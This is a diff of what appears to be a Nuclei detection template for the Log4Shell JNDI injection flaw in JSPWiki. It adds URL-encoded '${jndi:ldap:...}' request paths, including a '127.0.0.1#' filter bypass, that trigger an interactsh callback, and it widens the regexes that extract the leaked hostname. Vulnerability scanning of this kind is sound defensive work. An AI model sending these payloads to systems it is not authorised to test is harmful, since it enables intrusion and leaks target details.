@@ -16,7 +16,8 @@ requests:
     path:
       - "{{BaseURL}}/wiki/$%7Bjndi:ldap:$%7B::-/%7D/{{Host}}.{{interactsh-url}}%7D/"
       - "{{BaseURL}}/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/{{Host}}.{{interactsh-url}}%7D/"
-     #- "{{BaseURL}}/wiki/$%7bjndi:ldap:%2f%2f127.0.0.1%23{{Host}}.{{interactsh-url}}%7d"
+      - "{{BaseURL}}/wiki/$%7bjndi:ldap:%2f%2f127.0.0.1%23{{Host}}.{{interactsh-url}}%7d"
+      - "{{BaseURL}}/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/127.0.0.1%23{{Host}}.{{interactsh-url}}%7D/"
     headers:
        User-Agent: Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
 
@@ -30,12 +31,12 @@ requests:
       - type: regex
         part: interactsh_request
         regex:
-          - '([A-Za-z0-9\.\-\_]+)\.([a-z0-9]+)\.([a-z]+)\.([a-z]{2,4})'
+          - '([A-Za-z0-9\.\-\_\#]+)\.([a-z0-9]+)\.([a-z]+)\.([a-z]{2,4})'
 
     extractors:
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([A-Za-z0-9\.\-\_]+)\.([a-z0-9]+)\.([a-z]+)\.([a-z]{2,4})'   # Extract ${hostName}
+          - '([A-Za-z0-9\.\-\_\#]+)\.([a-z0-9]+)\.([a-z]+)\.([a-z]{2,4})'   # Extract ${hostName}
 
